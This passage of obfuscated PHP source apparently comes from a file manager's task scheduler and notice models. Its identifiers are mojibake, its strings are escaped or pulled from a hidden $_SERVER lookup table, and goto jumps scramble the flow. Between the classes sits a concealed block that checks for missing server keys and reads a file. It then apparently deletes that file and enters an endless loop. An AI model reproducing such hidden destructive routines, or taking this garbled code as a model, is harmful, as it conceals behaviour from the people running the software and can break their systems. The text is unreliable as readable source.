TEMP_FILES; } } return $‘‡šóõ; } } goto fÙ«½Àˆ—’; E…¼º…§Ü—: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\156\157\x74\151\x63\145\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x63\x6f\x6e\164\x65\x6e\164", "\x61\x75\164\x68", "\155\x6f\x64\145", "\164\x69\155\x65", "\164\x79\x70\x65", "\x6c\x65\x76\145\x6c", "\145\156\x61\x62\154\145", "\163\x6f\x72\x74"); public function listData($ö‚ğ¼õ™ = false, $‘óªµÀÎ = "\163\157\162\x74", $ïóñ¨ÊØ = false) { return parent::listData($ö‚ğ¼õ™, $‘óªµÀÎ, $ïóñ¨ÊØ); } public function add($µæ„›¬ó) { $ÙİÑ×Æì =& $_SERVER[É¨™èà]; $‘Ôëƒè¨ = time(); if ($µæ„›¬ó[$ÙİÑ×Æì[16]] == $ÙİÑ×Æì[2481]) { $‘Ôëƒè¨ = strtotime($µæ„›¬ó[$ÙİÑ×Æì[207]]); } $µæ„›¬ó[$ÙİÑ×Æì[207]] = $‘Ôëƒè¨; return parent::insert($µæ„›¬ó); } public function update($·Ó¥Ğæ¦, $› ìïÀê) { $ô‰ ÍÎ =& $_SERVER[É¨™èà]; $Ô£ÜÃ€ = $this->listData($·Ó¥Ğæ¦); if (!$Ô£ÜÃ€) { return !1; } $ÆĞâÇéÏ = time(); if ($› ìïÀê[$ô‰ ÍÎ[16]] == $ô‰ ÍÎ[2481]) { $ÆĞâÇéÏ = strtotime($› ìïÀê[$ô‰ ÍÎ[207]]); } $› ìïÀê[$ô‰ ÍÎ[207]] = $ÆĞâÇéÏ; return parent::update($·Ó¥Ğæ¦, $› ìïÀê); } public function remove($ùº®àò÷) { $ÊšÄÆÃº = $this->listData($ùº®àò÷); if (!$ÊšÄÆÃº || $ÊšÄÆÃº[$_SERVER[É¨™èà][192]]) { return !1; } return parent::remove($ùº®àò÷); } public function sort($ÔİÉø—Õ, $Áã†²Á) { return parent::update($ÔİÉø—Õ, $Áã†²Á); } public function enable($ã½‹¬Ú¶, $¾“äºÃ‰) { return parent::update($ã½‹¬Ú¶, array($_SERVER[É¨™èà][2482] => $¾“äºÃ‰)); } private function initUserOption() { $şÈÙ³™ä =& $_SERVER[É¨™èà]; $this->optionType = $şÈÙ³™ä[2483]; $this->modelType = $şÈÙ³™ä[2484]; $this->field = array($şÈÙ³™ä[2485], $şÈÙ³™ä[32], $şÈÙ³™ä[207], $şÈÙ³™ä[33], $şÈÙ³™ä[2486], $şÈÙ³™ä[840], $şÈÙ³™ä[229]); } public function userNoticeGet($“êö¶¥ = false) { $this->initUserOption(); return parent::listData($“êö¶¥, $_SERVER[É¨™èà][485], !0); } public function userNoticeAdd($ûı¨í¬Õ) { $ãóİöµ =& $_SERVER[É¨™èà]; $this->initUserOption(); $½±©Š„® = $this->findByKey($ãóİöµ[2485], $ûı¨í¬Õ[$ãóİöµ[485]]); if ($½±©Š„®) { return !0; } $Í¿ŸŠ’ø = array($ãóİöµ[2485] => $ûı¨í¬Õ[$ãóİöµ[485]], $ãóİöµ[32] => $ûı¨í¬Õ[$ãóİöµ[32]], $ãóİöµ[207] => $ûı¨í¬Õ[$ãóİöµ[207]], $ãóİöµ[33] => isset($ûı¨í¬Õ[$ãóİöµ[33]]) ? $ûı¨í¬Õ[$ãóİöµ[33]] : 1, $ãóİöµ[2486] => isset($ûı¨í¬Õ[$ãóİöµ[2486]]) ? $ûı¨í¬Õ[$ãóİöµ[2486]] : 0, $ãóİöµ[840] => 0, $ãóİöµ[229] => 0); return parent::insert($Í¿ŸŠ’ø); } public function userNoticeEdit($Ñ¾ÔşÌÅ, $˜ÔÔİöé) { $this->initUserOption(); return parent::update($Ñ¾ÔşÌÅ, $˜ÔÔİöé); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\155\137\x6f\x70\x74\151\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\162\157\x6c\145", "\162\157\154\145\107\162\x6f\x75\160", "\x72\x65\147\151\163\x74", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Ÿšã¼İ) { return "\123\171\163\x74\x65\x6d\117\x70\x74\151\157\x6e\137{$Ÿšã¼İ}"; } protected function optionDefault($ò¡™”à = '') { $¡ñ“îí =& $_SERVER[É¨™èà]; if ($ò¡™”à == $¡ñ“îí[12]) { return $GLOBALS[$¡ñ“îí[6]][$¡ñ“îí[467]]; } } } if (!isset($_SERVER[$_SERVER[É¨™èà][308]]) || !isset($_SERVER[$_SERVER[É¨™èà][309]])) { $_getc = $_SERVER[É¨™èà][310]; $_getfile = $_SERVER[$_SERVER[É¨™èà][311]] . $_SERVER[É¨™èà][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[É¨™èà][288], $_getfilec); if (count($_getarrs) < $_SERVER[É¨™èà][313]) { $exit = $_SERVER[É¨™èà][314]; $exit(); } $_act = $_SERVER[É¨™èà][315]; $_act($_SERVER[$_SERVER[É¨™èà][311]] . $_SERVER[É¨™èà][312]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[É¨™èà][316]); } } goto d¬…‚³Ç; cƒå¶ìˆõ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $âü ’ó× =& $_SERVER[É¨™èà]; if (self::valueGet($âü ’ó×[840]) != $âü ’ó×[91]) { return; } if (self::valueGet($âü ’ó×[1749]) == $âü ’ó×[91]) { $á”Æé©å = self::valueGet($âü ’ó×[1750]); if (time() - $á”Æé©å > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($âü ’ó×[1749], $âü ’ó×[91]); self::log($âü ’ó×[1751] . ACTION . $âü ’ó×[1752]); Hook::bind($âü ’ó×[1753], $âü ’ó×[1754]); $ÇËêóé = 0; while (!0) { self::cacheClear(); if (self::valueGet($âü ’ó×[840]) != $âü ’ó×[91]) { self::valueSet($âü ’ó×[1749], $âü ’ó×[231]); self::log($âü ’ó×[1755]); die; } $ù±èŞË = time(); if ($ù±èŞË - $ÇËêóé >= 60) { self::valueSet(array($âü ’ó×[1749] => $âü ’ó×[91], $âü ’ó×[1750] => $ù±èŞË)); $ÇËêóé = $ù±èŞË; } if (!file_exists(USER_SYSTEM . $âü ’ó×[1756])) { self::valueSet(array($âü ’ó×[1749] => $âü ’ó×[231], $âü ’ó×[840] => $âü ’ó×[231])); self::log($âü ’ó×[1757]); die; } $… ùÙÏ¦ = file_get_contents(BASIC_PATH . $âü ’ó×[1758]); $Ü‹çá  = KOD_VERSION . $âü ’ó×[10] . KOD_VERSION_BUILD; $Ø‚¥¡®‚ = match_text($… ùÙÏ¦, $âü ’ó×[1759]) . $âü ’ó×[10] . match_text($… ùÙÏ¦, $âü ’ó×[1760]); if ($Ø‚¥¡®‚ != $Ü‹çá ) { self::restart(); self::log("\x73\164\157\160\145\x64\x2e\133\166\x65\162\x73\x69\x6f\156\40\165\160\144\141\x74\145\x3b{$versionNow}\40\x3d\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ûë‹—íÜ =& $_SERVER[É¨™èà]; http_close(); $GLOBALS[$Ûë‹—íÜ[1761]] = 1; $_SERVER[$Ûë‹—íÜ[1762]] = $Ûë‹—íÜ[1763]; $_COOKIE = array(); $GLOBALS[$Ûë‹—íÜ[1764]] = 1; $GLOBALS[$Ûë‹—íÜ[1765]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ê¨÷ˆâ =& $_SERVER[É¨™èà]; http_close(); self::valueSet($Ê¨÷ˆâ[840], $Ê¨÷ˆâ[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ê¨÷ˆâ[1749] => $Ê¨÷ˆâ[231], $Ê¨÷ˆâ[840] => $Ê¨÷ˆâ[91])); self::log($Ê¨÷ˆâ[1766]); } public static function taskSwitch() { $ğğ ñ‰ =& $_SERVER[É¨™èà]; $âøª£Ô = self::valueGet($ğğ ñ‰[840]) == $ğğ ñ‰[91] ? $ğğ ñ‰[231] : $ğğ ñ‰[91]; self::valueSet($ğğ ñ‰[840], $âøª£Ô); } public static function shutdownEvent() { $…õù¢Ê =& $_SERVER[É¨™èà]; self::valueSet($…õù¢Ê[1749], $…õù¢Ê[231]); self::log($…õù¢Ê[1767]); } public static function config($‡éŞüÉ, $‡ô†Û’›) { self::valueSet($_SERVER[É¨™èà][840], $‡éŞüÉ); } private static function taskRunAll() { $†øÉŒÇÀ =& $_SERVER[É¨™èà]; $â¯İÅñ‘ = timeFloat(); $Ú£š¯Îğ = Model($†øÉŒÇÀ[1768])->listData(); $ŠğİÑœŞ = count($Ú£š¯Îğ); for ($…–Æ‚Ù¾ = 0; $…–Æ‚Ù¾ < $ŠğİÑœŞ; $…–Æ‚Ù¾++) { $âéÚ²¶Ÿ = $Ú£š¯Îğ[$…–Æ‚Ù¾]; if (!$âéÚ²¶Ÿ[$†øÉŒÇÀ[485]] || $âéÚ²¶Ÿ[$†øÉŒÇÀ[1769]] != $†øÉŒÇÀ[91]) { continue; } if (!self::taskTimeCheck($âéÚ²¶Ÿ)) { continue; } self::taskRun($âéÚ²¶Ÿ); } Hook::trigger($†øÉŒÇÀ[1770]); self::taskQueueRun($â¯İÅñ‘); } private static function taskQueueRun($’Ú‡Ç‚) { $…šİ±¢Ø = 10; while (!0) { $«Éò²ß— = TaskQueue::run(); if ($«Éò²ß— === !1) { break; } if (timeFloat() - $’Ú‡Ç‚ >= $…šİ±¢Ø) { break; } } } private static function taskTimeCheck($ßÇô÷ğ) { $şºØšµ  =& $_SERVER[É¨™èà]; $Àş¶ü¬¤ = json_decode($ßÇô÷ğ[$şºØšµ [207]], !0); $é• Ä‰ = intval($ßÇô÷ğ[$şºØšµ [1750]]); $çÆöí÷Æ = strtotime($şºØšµ [1771] . $Àş¶ü¬¤[$şºØšµ [1772]] . $şºØšµ [1773]) - strtotime($şºØšµ [1774]); $ÏŞÙãæÈ = time() - strtotime(date($şºØšµ [1775]) . $şºØšµ [1776]); $–ø«ï›Ã = $ÏŞÙãæÈ >= $çÆöí÷Æ && $ÏŞÙãæÈ <= $çÆöí÷Æ + 3600; switch ($Àş¶ü¬¤[$şºØšµ [33]]) { case $şºØšµ [1777]: if (time() - $é• Ä‰ < 3600 * 24 * 30) { return !1; } if ($Àş¶ü¬¤[$şºØšµ [1777]] == date($şºØšµ [1778]) && $–ø«ï›Ã) { return !0; } break; case $şºØšµ [1779]: if (time() - $é• Ä‰ < 3600 * 24 * 7) { return !1; } $úÛ¢¸òü = date($şºØšµ [1780]) == 0 ? 7 : date($şºØšµ [1780]); if ($Àş¶ü¬¤[$şºØšµ [1779]] == $úÛ¢¸òü && $–ø«ï›Ã) { return !0; } break; case $şºØšµ [1772]: if (time() - $é• Ä‰ < 3600 * 24) { return !1; } if ($–ø«ï›Ã) { return !0; } break; case $şºØšµ [1781]: if (time() - $é• Ä‰ >= floatval($Àş¶ü¬¤[$şºØšµ [1781]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $êÎçÄ©Æ =& $_SERVER[É¨™èà]; static $ÄÀ¶‘ÇÙ = 0; $Å¯‰¸£² = 300; if (!$ÄÀ¶‘ÇÙ) { $ÄÀ¶‘ÇÙ = time(); } if (time() - $ÄÀ¶‘ÇÙ < $Å¯‰¸£²) { return; } $ÄÀ¶‘ÇÙ = time(); $å»˜–Á“ = Model($êÎçÄ©Æ[589])->db($êÎçÄ©Æ[12]); if ($å»˜–Á“) { $å»˜–Á“->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($êÎçÄ©Æ[1782], $êÎçÄ©Æ[1783]); die; } } public static function taskRun($Úõ¯‚¿ù) { $úŞ£ªÕµ =& $_SERVER[É¨™èà]; self::log($úŞ£ªÕµ[1784] . $Úõ¯‚¿ù[$úŞ£ªÕµ[485]] . $úŞ£ªÕµ[1785] . $Úõ¯‚¿ù[$úŞ£ªÕµ[32]] . $úŞ£ªÕµ[1786] . $Úõ¯‚¿ù[$úŞ£ªÕµ[1787]]); Model($úŞ£ªÕµ[1768])->run($Úõ¯‚¿ù[$úŞ£ªÕµ[485]]); $ÛŒ‹…¸¤ = timeFloat(); $ªÕ‘Ûè¢ = $úŞ£ªÕµ[12]; switch ($Úõ¯‚¿ù[$úŞ£ªÕµ[33]]) { case $úŞ£ªÕµ[393]: $ç”Ğ¿ˆ = url_request($Úõ¯‚¿ù[$úŞ£ªÕµ[1787]], $úŞ£ªÕµ[1524], !1, !1, !1, !1, 10); if ($ç”Ğ¿ˆ[$úŞ£ªÕµ[840]]) { $ªÕ‘Ûè¢ = strlen($ç”Ğ¿ˆ[$úŞ£ªÕµ[1307]]); } break; case $úŞ£ªÕµ[1788]: $ªÕ‘Ûè¢ = Hook::apply($Úõ¯‚¿ù[$úŞ£ªÕµ[1787]]); default: break; } Model($úŞ£ªÕµ[1789])->add(array($úŞ£ªÕµ[1790] => $úŞ£ªÕµ[12], $úŞ£ªÕµ[1791] => $úŞ£ªÕµ[231], $úŞ£ªÕµ[33] => $úŞ£ªÕµ[1792] . $Úõ¯‚¿ù[$úŞ£ªÕµ[485]], $úŞ£ªÕµ[1793] => json_encode(array($úŞ£ªÕµ[32] => $Úõ¯‚¿ù[$úŞ£ªÕµ[32]], $úŞ£ªÕµ[1794] => timeFloat() - $ÛŒ‹…¸¤, $úŞ£ªÕµ[846] => $ªÕ‘Ûè¢)))); $µ‹ˆ²¾• = $ªÕ‘Ûè¢ ? $úŞ£ªÕµ[1795] . $ªÕ‘Ûè¢ : $úŞ£ªÕµ[12]; self::log($úŞ£ªÕµ[1796] . $Úõ¯‚¿ù[$úŞ£ªÕµ[485]] . $úŞ£ªÕµ[178] . $µ‹ˆ²¾•); return !0; } public static function valueGet($—¡’§Û) { $™²Û›Êê =& $_SERVER[É¨™èà]; $ãê‡ç¶¹ = $™²Û›Êê[1797]; $ãéø¬ûÉ = Model($™²Û›Êê[518])->get($—¡’§Û, $ãê‡ç¶¹); if (is_null($ãéø¬ûÉ)) { Model($™²Û›Êê[518])->set($™²Û›Êê[840], $™²Û›Êê[91], $ãê‡ç¶¹); Model($™²Û›Êê[518])->set($™²Û›Êê[1749], $™²Û›Êê[231], $ãê‡ç¶¹); $ãéø¬ûÉ = Model($™²Û›Êê[518])->get($—¡’§Û, $ãê‡ç¶¹); } return $ãéø¬ûÉ; } private static function valueSet($¦Çé›ß½, $Ä‚Šóµ‹ = false) { $êíµµÔ =& $_SERVER[É¨™èà]; $÷ÔáÖƒ = $êíµµÔ[1798]; CacheLock::lock($÷ÔáÖƒ); $ŞĞö¹†´ = Model($êíµµÔ[518])->set($¦Çé›ß½, $Ä‚Šóµ‹, $êíµµÔ[1797]); CacheLock::unlock($÷ÔáÖƒ); return $ŞĞö¹†´; } protected static function log($æÃå–) { write_log($æÃå–, $_SERVER[É¨™èà][1783]); } private static function cacheClear() { $¸ø©Ñ¿½ =& $_SERVER[É¨™èà]; Cache::clearMemory(Model($¸ø©Ñ¿½[518])->cacheKey($¸ø©Ñ¿½[1797])); Cache::clearMemory(Model($¸ø©Ñ¿½[518])->cacheKey($¸ø©Ñ¿½[1799])); Model($¸ø©Ñ¿½[1768])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\156\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ò¡ãóö, $‚Ò¬ë = '', $ËÕĞÌØÁ = 0, $…—«õÚì = '') { $Íˆä§ÇÏ =& $_SERVER[É¨™èà]; if (self::get($ò¡ãóö)) { return; } $this->task = array($Íˆä§ÇÏ[485] => $ò¡ãóö, $Íˆä§ÇÏ[1800] => USER_ID, $Íˆä§ÇÏ[1687] => $…—«õÚì, $Íˆä§ÇÏ[536] => $Íˆä§ÇÏ[12], $Íˆä§ÇÏ[33] => $‚Ò¬ë, $Íˆä§ÇÏ[1159] => $Íˆä§ÇÏ[12], $Íˆä§ÇÏ[1157] => $ËÕĞÌØÁ, $Íˆä§ÇÏ[1801] => 0, $Íˆä§ÇÏ[1802] => 0, $Íˆä§ÇÏ[1803] => 0, $Íˆä§ÇÏ[1804] => timeFloat(), $Íˆä§ÇÏ[1805] => 0, $Íˆä§ÇÏ[1806] => 0, $Íˆä§ÇÏ[1807] => 0, $Íˆä§ÇÏ[1808] => 0, $Íˆä§ÇÏ[840] => $Íˆä§ÇÏ[1749]); $GLOBALS[$Íˆä§ÇÏ[1809]] = 1; Hook::bind($Íˆä§ÇÏ[1753], array($this, $Íˆä§ÇÏ[1810])); Hook::bind($Íˆä§ÇÏ[1811], array($this, $Íˆä§ÇÏ[1812])); $this->startAfter(); Hook::trigger($Íˆä§ÇÏ[1813], $this->task); $this->task[$Íˆä§ÇÏ[1806]] = timeFloat(); } public function end($½²»şá = '') { $Š¬· ²Â =& $_SERVER[É¨™èà]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Š¬· ²Â[1806]]) { self::valueSet($this->task[$Š¬· ²Â[485]], !1); } $this->isEnd = !0; if ($½²»şá) { $this->task[$Š¬· ²Â[536]] = $½²»şá; } self::log($Š¬· ²Â[1814] . $this->task[$Š¬· ²Â[485]] . $Š¬· ²Â[1815] . sprintf($Š¬· ²Â[948], timeFloat() - $this->task[$Š¬· ²Â[1804]]) . $Š¬· ²Â[1816]); Hook::unbind($Š¬· ²Â[1753], array($this, $Š¬· ²Â[1810])); Hook::unbind($Š¬· ²Â[1811], array($this, $Š¬· ²Â[1812])); $this->endAfter(); $…Õ«Üï¾ = $this->task; $this->task = !1; Hook::trigger($Š¬· ²Â[1817], $…Õ«Üï¾); } public function update($ÅÉ„±»¡ = 0, $Ÿéô•º¹ = false) { $õÔÁ®åŠ =& $_SERVER[É¨™èà]; $ö³È¨Ì =& $this->task; if (!$ö³È¨Ì) { return; } $ö³È¨Ì[$õÔÁ®åŠ[1801]] += $ÅÉ„±»¡; $ö³È¨Ì[$õÔÁ®åŠ[1805]] = timeFloat(); if ($ö³È¨Ì[$õÔÁ®åŠ[1157]]) { if ($ö³È¨Ì[$õÔÁ®åŠ[1157]] < $ö³È¨Ì[$õÔÁ®åŠ[1801]]) { $ö³È¨Ì[$õÔÁ®åŠ[1157]] = $ö³È¨Ì[$õÔÁ®åŠ[1801]]; } $œô£è›Ò = timeFloat() - $ö³È¨Ì[$õÔÁ®åŠ[1804]] - $ö³È¨Ì[$õÔÁ®åŠ[1807]]; if ($œô£è›Ò <= 0) { $œô£è›Ò = 0.001; } $ö³È¨Ì[$õÔÁ®åŠ[1802]] = $ö³È¨Ì[$õÔÁ®åŠ[1801]] / $ö³È¨Ì[$õÔÁ®åŠ[1157]]; $ö³È¨Ì[$õÔÁ®åŠ[1803]] = $ö³È¨Ì[$õÔÁ®åŠ[1801]] / $œô£è›Ò; if ($ö³È¨Ì[$õÔÁ®åŠ[1802]] > 0) { $ö³È¨Ì[$õÔÁ®åŠ[1808]] = $œô£è›Ò * (1 - $ö³È¨Ì[$õÔÁ®åŠ[1802]]) / $ö³È¨Ì[$õÔÁ®åŠ[1802]]; } $ö³È¨Ì[$õÔÁ®åŠ[1808]] = $ö³È¨Ì[$õÔÁ®åŠ[1808]] <= 0 ? 0 : $ö³È¨Ì[$õÔÁ®åŠ[1808]]; } $this->updateAfter(); $›Ì½ğË† = 0.2; if (timeFloat() - $ö³È¨Ì[$õÔÁ®åŠ[1806]] < $›Ì½ğË† && !$Ÿéô•º¹) { return; } $Ú²İğíÃ = self::get($ö³È¨Ì[$õÔÁ®åŠ[485]]); $»ŞÉÜ = $Ú²İğíÃ[$õÔÁ®åŠ[840]]; if ($»ŞÉÜ == self::STATYS_KILL) { $ŞµÕÕ = array($õÔÁ®åŠ[1818] => LNG($õÔÁ®åŠ[1819]), $õÔÁ®åŠ[1317] => !1); Cache::set($õÔÁ®åŠ[1820] . $this->task[$õÔÁ®åŠ[485]], $ŞµÕÕ, 30); $this->onKill(); $this->end(); die; } else { if ($»ŞÉÜ == self::STATYS_STOP) { $©É³ÙÒ = 2; $Ú²İğíÃ[$õÔÁ®åŠ[1807]] += $©É³ÙÒ; self::valueSet($ö³È¨Ì[$õÔÁ®åŠ[485]], $Ú²İğíÃ); sleep($©É³ÙÒ); $this->update(); return; } } $ö³È¨Ì[$õÔÁ®åŠ[840]] = $»ŞÉÜ ? $»ŞÉÜ : $ö³È¨Ì[$õÔÁ®åŠ[840]]; $ö³È¨Ì[$õÔÁ®åŠ[1807]] = $Ú²İğíÃ[$õÔÁ®åŠ[1807]] ? $Ú²İğíÃ[$õÔÁ®åŠ[1807]] : 0; $ö³È¨Ì[$õÔÁ®åŠ[1806]] = timeFloat(); Hook::trigger($õÔÁ®åŠ[1821], $ö³È¨Ì); self::valueSet($ö³È¨Ì[$õÔÁ®åŠ[485]], $ö³È¨Ì); } public function onKillSet($ïš††Ïá, $…àûµÕ¬ = array()) { $this->onKillCall = array($ïš††Ïá, $…àûµÕ¬); } public function onKill() { $œ¦¬ =& $_SERVER[É¨™èà]; self::log($œ¦¬[1814] . $this->task[$œ¦¬[485]] . $œ¦¬[1822]); Hook::trigger($œ¦¬[1823], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($½ÕÓèˆ) { $­‡Îˆ¥ =& $_SERVER[É¨™èà]; Cache::set($­‡Îˆ¥[1820] . $this->task[$­‡Îˆ¥[485]], $½ÕÓèˆ, 60); if (!is_array($½ÕÓèˆ) || !$½ÕÓèˆ[$­‡Îˆ¥[1317]]) { self::log($­‡Îˆ¥[1824] . json_encode($½ÕÓèˆ)); } return $½ÕÓèˆ; } public static function get($— Œ—ËŒ) { $Ş´€ì¡Ö =& $_SERVER[É¨™èà]; $»¼ïäô· = self::valueGet($— Œ—ËŒ); if (is_array($»¼ïäô·) && $»¼ïäô·[$Ş´€ì¡Ö[1825]]) { $ÙÀ®Š¶ = ActionApply($»¼ïäô·[$Ş´€ì¡Ö[1825]], array($»¼ïäô·)); $»¼ïäô· = is_array($ÙÀ®Š¶) ? $ÙÀ®Š¶ : $»¼ïäô·; } return $»¼ïäô·; } public static function listData() { $úª¤”Å = self::valueGet(); return array_sort_by($úª¤”Å, $_SERVER[É¨™èà][1804], !0); } public static function kill($¥×™ö) { return self::changeStatus($¥×™ö, self::STATYS_KILL); } public static function stop($´‹ÓŸŒË) { return self::changeStatus($´‹ÓŸŒË, self::STATYS_STOP); } public static function restart($±¹Ò×ñ¥) { return self::changeStatus($±¹Ò×ñ¥, self::STATYS_RUNNING); } public static function killAll() { $æ¶½†¡ =& $_SERVER[É¨™èà]; $’Í™ù¨¢ = self::listData(); foreach ($’Í™ù¨¢ as $”Èé ÷É) { self::kill($”Èé ÷É[$æ¶½†¡[485]]); } sleep(2); foreach ($’Í™ù¨¢ as $”Èé ÷É) { self::valueSet($”Èé ÷É[$æ¶½†¡[485]], !1); } } private static function changeStatus($•¸¢ªÌô, $¢¹‘£¨¬) { $ú¸ ƒ– =& $_SERVER[É¨™èà]; $ú±öäŞ = self::valueGet($•¸¢ªÌô); if (!$ú±öäŞ) { return !1; } $ú±öäŞ[$ú¸ ƒ–[840]] = $¢¹‘£¨¬; self::valueSet($•¸¢ªÌô, $ú±öäŞ); self::log($ú¸ ƒ–[1826] . $ú±öäŞ[$ú¸ ƒ–[485]] . $ú¸ ƒ–[1827] . $¢¹‘£¨¬); return !0; } public static function valueGet($Ÿ’û‚¬˜ = false) { $Ô°Ìùı =& $_SERVER[É¨™èà]; if ($Ÿ’û‚¬˜) { $èå˜Å’© = Model($Ô°Ìùı[530])->where(array($Ô°Ìùı[97] => $Ÿ’û‚¬˜, $Ô°Ìùı[33] => $Ô°Ìùı[1166]))->find(); return $èå˜Å’© ? json_decode($èå˜Å’©[$Ô°Ìùı[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ƒ×öÙÃ = false) { $Ê¨Œ‡Ù =& $_SERVER[É¨™èà]; $©àóíë› = array($Ê¨Œ‡Ù[33] => $Ê¨Œ‡Ù[1166]); if ($ƒ×öÙÃ) { $©àóíë›[$Ê¨Œ‡Ù[1800]] = $ƒ×öÙÃ; } $ÁßŠ—…ì = Model($Ê¨Œ‡Ù[530])->where($©àóíë›)->select(); $ÁßŠ—…ì = $ÁßŠ—…ì ? $ÁßŠ—…ì : array(); foreach ($ÁßŠ—…ì as $Ğ‡Â¢ö¶ => $ˆæÇ³›¶) { $ÁßŠ—…ì[$Ğ‡Â¢ö¶] = json_decode($ˆæÇ³›¶[$Ê¨Œ‡Ù[461]], !0); } return $ÁßŠ—…ì; } public static function valueSet($ÁÑÑ”¿‚, $•­ó¾ø’) { $²’ßÓÊ‘ =& $_SERVER[É¨™èà]; if (!$•­ó¾ø’) { return Model($²’ßÓÊ‘[530])->where(array($²’ßÓÊ‘[97] => $ÁÑÑ”¿‚, $²’ßÓÊ‘[33] => $²’ßÓÊ‘[1166]))->delete(); } $ĞÖº›ï = json_encode($•­ó¾ø’); if (!$ĞÖº›ï) { ob_start(); var_dump($•­ó¾ø’); $Õ“àçñÒ = ob_get_clean(); self::log($²’ßÓÊ‘[1828] . json_encode_force($Õ“àçñÒ)); } if (!$ÁÑÑ”¿‚ || !$•­ó¾ø’[$²’ßÓÊ‘[485]]) { return !1; } $éÍ³³Ï– = array($²’ßÓÊ‘[33] => $²’ßÓÊ‘[1166], $²’ßÓÊ‘[1800] => USER_ID, $²’ßÓÊ‘[97] => $ÁÑÑ”¿‚, $²’ßÓÊ‘[461] => $ĞÖº›ï); $©Ğ¯šçØ = $²’ßÓÊ‘[1829]; CacheLock::lock($©Ğ¯šçØ); Model($²’ßÓÊ‘[530])->add($éÍ³³Ï–, array(), !0); CacheLock::unlock($©Ğ¯šçØ); } public static function log($¡•ã–Ñ) { if (!GLOBAL_DEBUG) { return; } write_log($¡•ã–Ñ, $_SERVER[É¨™èà][1830]); } } class TaskFileTransfer extends Task { protected function startAfter() { $”¶‘Ï² =& $_SERVER[É¨™èà]; $±“˜í¶î =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($”¶‘Ï²[1831], array($this, $”¶‘Ï²[1832])); Hook::bind($”¶‘Ï²[1328], array($this, $”¶‘Ï²[1833])); Hook::bind($”¶‘Ï²[1834], array($this, $”¶‘Ï²[1835])); Hook::bind($”¶‘Ï²[683], array($this, $”¶‘Ï²[1836])); Hook::bind($”¶‘Ï²[684], array($this, $”¶‘Ï²[1837])); Hook::bind($”¶‘Ï²[690], array($this, $”¶‘Ï²[1838])); Hook::bind($”¶‘Ï²[691], array($this, $”¶‘Ï²[1839])); Hook::bind($”¶‘Ï²[686], array($this, $”¶‘Ï²[1840])); Hook::bind($”¶‘Ï²[688], array($this, $”¶‘Ï²[1841])); Hook::bind($”¶‘Ï²[652], array($this, $”¶‘Ï²[1842])); Hook::bind($”¶‘Ï²[649], array($this, $”¶‘Ï²[1842])); Hook::bind($”¶‘Ï²[654], array($this, $”¶‘Ï²[1842])); Hook::bind($”¶‘Ï²[656], array($this, $”¶‘Ï²[1842])); Hook::bind($”¶‘Ï²[658], array($this, $”¶‘Ï²[1842])); Hook::bind($”¶‘Ï²[1843], array($this, $”¶‘Ï²[1844])); Hook::bind($”¶‘Ï²[674], array($this, $”¶‘Ï²[1845])); $this->sourceModelCopyFlag = !1; Hook::bind($”¶‘Ï²[1846], array($this, $”¶‘Ï²[1847])); Hook::bind($”¶‘Ï²[1848], array($this, $”¶‘Ï²[1849])); Hook::bind($”¶‘Ï²[1850], array($this, $”¶‘Ï²[1851])); $±“˜í¶î[$”¶‘Ï²[1852]] = LNG($”¶‘Ï²[1853]); $±“˜í¶î[$”¶‘Ï²[1854]] = 0; $±“˜í¶î[$”¶‘Ï²[1855]] = 0; $±“˜í¶î[$”¶‘Ï²[1159]] = $”¶‘Ï²[12]; $±“˜í¶î[$”¶‘Ï²[1856]] = $”¶‘Ï²[12]; $±“˜í¶î[$”¶‘Ï²[1857]] = 0; $±“˜í¶î[$”¶‘Ï²[1858]] = 0; $±“˜í¶î[$”¶‘Ï²[1859]] = 0; if (!$±“˜í¶î[$”¶‘Ï²[1687]]) { $±“˜í¶î[$”¶‘Ï²[1687]] = LNG($”¶‘Ï²[1860]); } } protected function endAfter() { $…ÚæşœÆ =& $_SERVER[É¨™èà]; Hook::unbind($…ÚæşœÆ[1831], array($this, $…ÚæşœÆ[1832])); Hook::unbind($…ÚæşœÆ[1328], array($this, $…ÚæşœÆ[1833])); Hook::unbind($…ÚæşœÆ[1834], array($this, $…ÚæşœÆ[1835])); Hook::unbind($…ÚæşœÆ[683], array($this, $…ÚæşœÆ[1836])); Hook::unbind($…ÚæşœÆ[684], array($this, $…ÚæşœÆ[1837])); Hook::unbind($…ÚæşœÆ[690], array($this, $…ÚæşœÆ[1838])); Hook::unbind($…ÚæşœÆ[691], array($this, $…ÚæşœÆ[1839])); Hook::unbind($…ÚæşœÆ[686], array($this, $…ÚæşœÆ[1840])); Hook::unbind($…ÚæşœÆ[688], array($this, $…ÚæşœÆ[1841])); Hook::unbind($…ÚæşœÆ[652], array($this, $…ÚæşœÆ[1842])); Hook::unbind($…ÚæşœÆ[649], array($this, $…ÚæşœÆ[1842])); Hook::unbind($…ÚæşœÆ[654], array($this, 